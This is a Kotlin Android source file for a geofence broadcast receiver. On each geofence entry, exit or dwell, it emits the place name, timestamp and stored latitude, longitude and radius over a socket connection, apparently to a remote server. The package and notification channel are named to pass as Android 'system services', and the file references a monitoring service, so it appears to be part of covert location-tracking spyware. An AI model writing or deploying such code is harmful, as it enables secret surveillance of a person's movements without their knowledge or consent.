package com.android.systemservices

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.google.android.gms.location.Geofence
import com.google.android.gms.location.GeofencingEvent
import org.json.JSONObject

class GeofenceReceiver : BroadcastReceiver() {
    private val TAG = "GeofenceReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        val event = GeofencingEvent.fromIntent(intent) ?: return
        if (event.hasError()) {
            Log.e(TAG, "GeofencingEvent error code: ${event.errorCode}")
            return
        }
        val transition = event.geofenceTransition
        val transitionLabel = when (transition) {
            Geofence.GEOFENCE_TRANSITION_ENTER -> "enter"
            Geofence.GEOFENCE_TRANSITION_EXIT  -> "exit"
            Geofence.GEOFENCE_TRANSITION_DWELL -> "dwell"
            else -> {
                Log.w(TAG, "Unknown transition type: $transition")
                return
            }
        }
        val triggering = event.triggeringGeofences ?: return
        val stored = GeofenceManager(context).getAll().associateBy { it.id }

        for (gf in triggering) {
            val entry = stored[gf.requestId]
            val name  = entry?.name ?: gf.requestId

            SocketManager.emit("geofence_alert", JSONObject().apply {
                put("geofenceId",  gf.requestId)
                put("name",        name)
                put("transition",  transitionLabel)
                put("timestamp",   System.currentTimeMillis())
                if (entry != null) {
                    put("lat",    entry.lat)
                    put("lng",    entry.lng)
                    put("radius", entry.radius)
                }
            })

            showNotification(context, name, transitionLabel)
            Log.i(TAG, "Geofence $transitionLabel: $name (${gf.requestId})")
        }
    }

    private fun showNotification(context: Context, name: String, transition: String) {
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(MonitoringService.CHANNEL_ID) == null) {
            nm.createNotificationChannel(
                NotificationChannel(MonitoringService.CHANNEL_ID, "System Services",
                    NotificationManager.IMPORTANCE_LOW)
            )
        }
        val verb = when (transition) {
            "enter" -> "entered"
            "exit"  -> "left"
            "dwell" -> "is dwelling in"
            else    -> transition
        }
        nm.notify(
            NOTIF_ID_BASE + (name.hashCode() and 0x3FF),
            Notification.Builder(context, MonitoringService.CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setContentTitle("Geofence Alert")
                .setContentText("Device $verb: $name")
                .setAutoCancel(true)
                .build()
        )
    }

    companion object {
        private const val NOTIF_ID_BASE = 2000
    }
}
